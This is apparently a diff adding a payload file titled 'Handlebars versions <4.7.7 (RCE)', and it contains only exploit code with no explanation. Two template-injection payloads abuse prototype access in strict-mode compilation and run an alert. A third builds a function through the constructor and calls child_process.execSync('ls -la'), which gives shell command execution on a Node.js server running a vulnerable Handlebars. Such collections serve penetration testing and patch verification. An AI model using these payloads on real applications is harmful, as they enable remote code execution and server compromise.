@@ -1,0 +1,41 @@
+Handlebars versions <4.7.7 (RCE)
+
+
+<script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js"></script> <script> // compile the template var s = ` {{#with (__lookupGetter__ "__proto__")}} {{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} {{#with ../constructor.prototype}} {{../../constructor.defineProperty . "hasOwnProperty" ..}} {{/with}} {{/with}} {{/with}} {{#with "constructor"}} {{#with split}} {{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} {{#with .}} {{#with (concat (lookup join (slice 0 1)))}} {{#each (slice 2 3)}} {{#with (apply 0 ../..)}} {{.}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} `; var template = Handlebars.compile(s, { strict: true }); // execute the compiled template and print the output to the console console.log(template({})); </script>
+
+
+
+
+
+
+
+
+var s = ` {{#with (__lookupGetter__ "__proto__")}} {{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} {{#with ../constructor.prototype}} {{../../constructor.defineProperty . "hasOwnProperty" ..}} {{/with}} {{/with}} {{/with}} {{#with "constructor"}} {{#with split}} {{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} {{#with .}} {{#with (concat (lookup join (slice 0 1)))}} {{#each (slice 2 3)}} {{#with (apply 0 ../..)}} {{.}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} `; var template = Handlebars.compile(s, { strict: true }); console.log(template({}));
+
+
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+
+
+
+
+
